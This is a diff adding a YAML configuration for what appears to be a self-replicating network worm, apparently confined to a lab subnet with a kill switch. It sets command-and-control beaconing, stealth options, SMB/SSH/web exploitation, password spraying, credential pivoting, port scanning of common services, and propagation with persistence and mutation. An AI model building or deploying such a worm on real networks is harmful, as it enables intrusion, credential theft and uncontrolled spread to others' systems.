@@ -1,0 +1,82 @@
+c2:
+  backup_c2_servers: []
+  beacon_interval: 60
+  c2_port: 8443
+  c2_protocol: https
+  c2_server: 127.0.0.1
+  use_encryption: true
+evasion:
+  detect_honeypots: false
+  detect_ids: false
+  encrypt_traffic: false
+  max_scan_rate: 5000
+  randomize_timing: false
+  stealth_mode: true
+exploit:
+  credential_wordlist: wordlists/common_creds.txt
+  enable_credential_pivoting: true
+  enable_mutation: true
+  enable_password_spray: true
+  enable_smb: true
+  enable_ssh: true
+  enable_web: true
+  exploit_timeout: 10
+  lockout_threshold: 100
+  max_exploit_attempts: 1
+  spray_delay: 0.0
+  use_credentials: true
+  wordlist_dir: wordlists
+ml:
+  evasion_model_path: ml_models/saved/evasion_model.pkl
+  host_classifier_path: ml_models/saved/host_classifier.pkl
+  online_learning: true
+  rl_agent_path: ml_models/saved/rl_agent.zip
+  use_pretrained: false
+  use_thompson_sampling: false
+network:
+  excluded_ips:
+  - 192.168.100.1
+  max_threads: 50
+  ports_to_scan:
+  - 21
+  - 22
+  - 23
+  - 80
+  - 135
+  - 139
+  - 161
+  - 443
+  - 445
+  - 3389
+  - 5985
+  - 2222
+  - 3000
+  - 8080
+  - 8443
+  - 6379
+  - 5672
+  - 27017
+  - 5432
+  - 3306
+  - 1433
+  - 9200
+  scan_timeout: 5
+  target_ranges:
+  - 192.168.100.0/24
+propagation:
+  max_infections: 100
+  mutation_enabled: true
+  persistence_enabled: true
+  propagation_delay: 0.5
+  self_replicate: true
+safety:
+  allowed_networks:
+  - 192.168.100.0/24
+  auto_destruct_time: 0
+  enable_logging: true
+  geofence_enabled: false
+  kill_switch_code: EMERGENCY_STOP_2024
+  kill_switch_enabled: true
+  log_encryption: true
+  max_infections: 100
+  max_runtime_hours: 24
